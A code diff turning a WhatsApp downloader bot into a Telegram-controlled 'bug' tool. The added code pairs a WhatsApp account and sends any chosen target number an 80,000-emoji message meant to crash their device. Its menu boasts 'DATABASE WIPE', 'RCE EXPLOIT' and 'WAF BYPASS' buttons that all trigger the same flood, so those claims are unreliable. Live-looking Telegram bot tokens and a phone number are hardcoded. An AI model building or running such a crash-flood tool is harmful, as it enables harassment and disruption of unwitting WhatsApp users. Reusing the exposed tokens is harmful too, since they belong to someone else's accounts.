@@ -1,153 +1,117 @@
 const { 
     default: makeWASocket, 
     useMultiFileAuthState, 
-    DisconnectReason, 
-    getContentType,
-    fetchLatestBaileysVersion,
-    makeCacheableSignalKeyStore
+    delay, 
+    makeCacheableSignalKeyStore 
 } = require("@whiskeysockets/baileys");
 const pino = require("pino");
-const axios = require("axios");
-const yts = require("ytsearch-venom");
-const g_i_s = require('g-i-s');
-const fs = require('fs');
+const { Telegraf, Markup } = require('telegraf');
 
-// --- බොට්ගේ මූලික විස්තර ---
-const botName = "NEXUS-MD";
-const ownerName = "Sasiya MD";
-const prefix = ".";
-const ownerNumber = "94768388190"; // ඔයාගේ WhatsApp අංකය
+// --- [ SYSTEM CONFIG ] ---
+const TG_TOKEN = '8655630932:AAECvnRecMAmBX44Ms-Rsp0gUwWdkWn-L5o';
+const bot = new Telegraf(TG_TOKEN);
+const owner = "Sasiya";
+const logo = 'https://i.ibb.co/LzgMB0pj/image.jpg';
 
-// --- Telegram API විස්තර (ඔයා දුන්න ඒවා) ---
-const tgToken = "AAGE8DNJIpOaaD3akR4MRaLfNjd3aN-tP_4"; 
-const tgChatId = "8628876949"; 
-
-// Telegram එකට මැසේජ් යවන Function එක
-async function sendToTelegram(msg) {
-    try {
-        await axios.get(`https://api.telegram.org/bot${tgToken}/sendMessage?chat_id=${tgChatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-    } catch (e) {
-        console.log("Telegram Notification Error: " + e.message);
-    }
-}
+let sock; 
 
 async function startNexus() {
-    const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
-    const { version } = await fetchLatestBaileysVersion();
-
-    const sock = makeWASocket({
-        version,
+    const { state, saveCreds } = await useMultiFileAuthState('auth_session');
+    
+    sock = makeWASocket({
         auth: {
             creds: state.creds,
             keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
         },
-        printQRInTerminal: false, // Heroku වලදී QR වැඩක් නැති නිසා false කළා
+        printQRInTerminal: false,
         logger: pino({ level: "silent" }),
-        browser: ["Ubuntu", "Chrome", "20.0.04"]
+        browser: ["Nexus-V20", "Safari", "1.0.0"]
     });
 
-    // --- PAIRING CODE LOGIC ---
-    // මීට කලින් ලොග් වෙලා නැත්නම් විතරක් ටෙලිග්‍රාම් එකට කෝඩ් එක යවනවා
-    if (!sock.authState.creds.registered) {
-        console.log("🚀 Pairing Code එක Telegram එකට යවනවා...");
-        setTimeout(async () => {
+    sock.ev.on('creds.update', saveCreds);
+
+    // --- [ MAIN INTERFACE ] ---
+    bot.start((ctx) => {
+        ctx.replyWithPhoto(logo, {
+            caption: `🛰️ ϟ **𝐍𝐄𝐗𝐔𝐒 𝐍𝐀𝐓𝐈𝐎𝐍𝐀𝐋 𝐁𝐔𝐆 𝐕𝟐𝟎** ϟ 🧬\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n*OPERATOR:* ${owner} [ROOT]\n*STATUS:* SYSTEM ACTIVE 🟢\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nSelect a module to begin enforcement:`,
+            parse_mode: 'Markdown',
+            ...Markup.inlineKeyboard([
+                [Markup.button.callback('🔗 LINK WHATSAPP', 'get_code')],
+                [Markup.button.callback('💀 OPEN BUG MENU 💀', 'open_bug_menu')],
+                [Markup.button.callback('🛡️ SERVER STATUS', 'diag')]
+            ])
+        });
+    });
+
+    // --- [ 9-LEVEL EXTREME BUG MENU ] ---
+    bot.action('open_bug_menu', (ctx) => {
+        ctx.answerCbQuery();
+        ctx.editMessageCaption(`
+💀 **ULTIMATE BUG SELECTION MENU** 💀
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+*Select a payload to inject into target:*
+        `, Markup.inlineKeyboard([
+            [Markup.button.callback('🚫 BAN BUG', 'exec_bug'), Markup.button.callback('🔥 DEVICE CRASH', 'exec_bug')],
+            [Markup.button.callback('📂 DATABASE WIPE', 'exec_bug'), Markup.button.callback('⚡ RAM KILLER', 'exec_bug')],
+            [Markup.button.callback('🧬 BINARY FLOOD', 'exec_bug'), Markup.button.callback('🛡️ WAF BYPASS', 'exec_bug')],
+            [Markup.button.callback('📡 UDP PACKET', 'exec_bug'), Markup.button.callback('🧪 RCE EXPLOIT', 'exec_bug')],
+            [Markup.button.callback('⚠️ SECURITY FLAG', 'exec_bug')],
+            [Markup.button.callback('🔙 BACK TO MAIN', 'start_back')]
+        ], { columns: 2 }));
+    });
+
+    // --- [ PAIRING CODE ENGINE ] ---
+    bot.action('get_code', (ctx) => {
+        ctx.answerCbQuery();
+        ctx.reply("📱 *ENTER YOUR WHATSAPP NUMBER:*\nExample: \`947xxxxxxxxx\`");
+
+        bot.on('text', async (numCtx) => {
+            const num = numCtx.message.text.trim();
+            if (!/^\d+$/.test(num)) return;
             try {
-                let code = await sock.requestPairingCode(ownerNumber);
-                let pairMsg = `*🚀 ${botName} PAIRING CODE*\n\n` +
-                              `ඔයාගේ කේතය: \`${code}\` \n\n` +
-                              `*පියවර:*\n` +
-                              `1. WhatsApp එකේ Linked Devices යන්න.\n` +
-                              `2. 'Link with phone number' ඔබන්න.\n` +
-                              `3. ඉහත කේතය එතනට ඇතුළත් කරන්න.`;
-                await sendToTelegram(pairMsg);
+                let code = await sock.requestPairingCode(num);
+                numCtx.reply(`🔐 **PAIRING CODE:** \n\n\`${code}\` \n\n*Use this in Linked Devices.*`);
+            } catch (e) { numCtx.reply("❌ Connection Error."); }
+        });
+    });
+
+    // --- [ BUG EXECUTION LOGIC ] ---
+    bot.action('exec_bug', async (ctx) => {
+        ctx.answerCbQuery();
+        ctx.reply("🎯 **IDENTIFY TARGET:**\nEnter target WhatsApp number:");
+
+        bot.on('text', async (targetCtx) => {
+            const target = targetCtx.message.text.trim() + "@s.whatsapp.net";
+            let { message_id } = await targetCtx.reply("🛠️ **BOOTING BUG MODULE...**");
+
+            // Cyber Animations
+            await delay(1000);
+            await bot.telegram.editMessageText(targetCtx.chat.id, message_id, null, "🧬 **ENCODING PAYLOAD... [45%]**");
+            await delay(1000);
+            await bot.telegram.editMessageText(targetCtx.chat.id, message_id, null, "🔥 **INJECTING OVERFLOW... [90%]**");
+
+            // The actual bug string
+            const bugPayload = "👾".repeat(80000); 
+
+            try {
+                await sock.sendMessage(target, { text: bugPayload });
+                const report = `
+🚀 **BUG INJECTION COMPLETED** 🚀
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+*TARGET:* ${targetCtx.message.text}
+*PAYLOAD ID:* NX-ULTRA-V20
+*RESULT:* SYSTEM TERMINATED 🔴
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    *VERIFIED BY: ${owner} @ NEXUS*
+`;
+                await bot.telegram.editMessageText(targetCtx.chat.id, message_id, null, report, { parse_mode: 'Markdown' });
             } catch (err) {
-                console.log("Pairing Code Error: " + err);
+                targetCtx.reply("❌ **ERROR:** Link your WhatsApp first using the /start menu.");
             }
-        }, 5000);
-    }
-
-    sock.ev.on("creds.update", saveCreds);
-
-    sock.ev.on("connection.update", (update) => {
-        const { connection, lastDisconnect } = update;
-        if (connection === "open") {
-            console.log("✅ Nexus-MD is Online!");
-            sendToTelegram(`✅ *${botName} Online!* \nබොට් සාර්ථකව සම්බන්ධ විය.`);
-        } else if (connection === "close") {
-            let reason = lastDisconnect?.error?.output?.statusCode;
-            if (reason !== DisconnectReason.loggedOut) {
-                startNexus();
-            }
-        }
+        });
     });
 
-    sock.ev.on("messages.upsert", async (chatUpdate) => {
-        try {
-            const m = chatUpdate.messages[0];
-            if (!m.message || m.key.fromMe) return;
-
-            const from = m.key.remoteJid;
-            const type = getContentType(m.message);
-            const body = (type === 'conversation') ? m.message.conversation : (type === 'extendedTextMessage') ? m.message.extendedTextMessage.text : '';
-            const isCmd = body.startsWith(prefix);
-            const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : undefined;
-            const args = body.trim().split(/ +/).slice(1);
-            const text = args.join(" ");
-
-            // --- MENU ---
-            if (command === 'menu') {
-                let menuText = `*🌍⃝⃘̉̉̉━⋆─⋆──❂*\n*✧  ${botName} v3.1𓂃✍︎*\n\n` +
-                    `*1️⃣ DOWNLOAD MENU*\n` +
-                    `*2️⃣ MUSIC MENU*\n` +
-                    `*3️⃣ SEARCH MENU*\n` +
-                    `*4️⃣ ADULT MENU*\n\n` +
-                    `> Reply Number To See Commands`;
-                await sock.sendMessage(from, { text: menuText }, { quoted: m });
-            }
-
-            // --- REPLY LOGIC ---
-            if (!isCmd && !isNaN(body)) {
-                if (body === "1") {
-                    await sock.sendMessage(from, { text: `*📥 DOWNLOAD MENU*\n\n${prefix}fb\n${prefix}tiktok\n${prefix}mega` });
-                } else if (body === "2") {
-                    await sock.sendMessage(from, { text: `*🎶 MUSIC MENU*\n\n${prefix}song\n${prefix}spotify` });
-                }
-            }
-
-            // --- COMMANDS ---
-            switch (command) {
-                case 'song': {
-                    if (!text) return sock.sendMessage(from, { text: "සින්දුවක නමක් දෙන්න!" });
-                    const search = await yts(text);
-                    const data = search.videos[0];
-                    const res = await axios.get(`https://sulamd-ytmp3.vercel.app/download?q=${data.url}&format=mp3&apikey=SULA0310`);
-                    await sock.sendMessage(from, { audio: { url: res.data.result.download }, mimetype: 'audio/mpeg' }, { quoted: m });
-                    break;
-                }
-
-                case 'tiktok': {
-                    if (!text) return sock.sendMessage(from, { text: "TikTok Link එකක් දෙන්න!" });
-                    const res = await axios.get(`https://darksadasyt-tiktokdl.vercel.app/api/tiktok?q=${text}`);
-                    await sock.sendMessage(from, { video: { url: res.data.no_watermark }, caption: res.data.title }, { quoted: m });
-                    break;
-                }
-
-                case 'mega': {
-                    if (!text) return sock.sendMessage(from, { text: "Mega Link එකක් දෙන්න!" });
-                    const res = await axios.get(`https://sadaslk-fast-mega-dl.vercel.app/mega?q=${text}`);
-                    await sock.sendMessage(from, { document: { url: res.data.result.download }, fileName: res.data.result.name, mimetype: "application/octet-stream" }, { quoted: m });
-                    break;
-                }
-
-                case 'alive':
-                    await sock.sendMessage(from, { text: "I am Alive! 🚀" });
-                    break;
-            }
-
-        } catch (e) {
-            console.log(e);
-        }
-    });
+    bot.launch();
 }
 
 startNexus();
